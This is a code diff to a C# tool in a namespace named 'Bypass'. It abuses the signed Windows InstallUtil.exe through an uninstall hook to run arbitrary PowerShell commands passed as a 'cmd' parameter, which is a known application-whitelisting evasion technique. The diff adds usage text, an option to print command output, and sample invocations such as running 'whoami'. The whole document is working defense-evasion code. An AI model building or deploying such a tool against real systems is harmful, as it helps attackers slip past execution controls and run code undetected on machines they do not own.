@@ -8,7 +8,9 @@ namespace Bypass
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("You better uninstall me :)");
+            Console.WriteLine("Usage: InstallUtil.exe /U /cmd:\"whoami\" /output sar.exe");
+            Console.WriteLine("/cmd:\"your command here\"");
+            Console.WriteLine("/output - if you want to see the output");
         }
     }
     [System.ComponentModel.RunInstaller(true)]
@@ -19,6 +21,9 @@ namespace Bypass
             // Retrieve the cmd parameter from the install context
             String cmd = Context.Parameters["cmd"];
 
+            // Retrieve the optional output parameter
+            bool showOutput = Context.Parameters.ContainsKey("output");
+
             // Ensure the cmd parameter is not null or empty before executing
             if (!string.IsNullOrEmpty(cmd))
             {
@@ -27,7 +32,20 @@ namespace Bypass
                 PowerShell ps = PowerShell.Create();
                 ps.Runspace = rs;
                 ps.AddScript(cmd);
-                ps.Invoke();
+
+                // Invoke and capture output if the output parameter is provided
+                if (showOutput)
+                {
+                    foreach (PSObject result in ps.Invoke())
+                    {
+                        Console.WriteLine(result.ToString());
+                    }
+                }
+                else
+                {
+                    ps.Invoke();
+                }
+
                 rs.Close();
             }
             else
@@ -38,3 +56,4 @@ namespace Bypass
         }
     }
 }
+installutil.exe /cmd:"Get-Process" /output myapp.exe
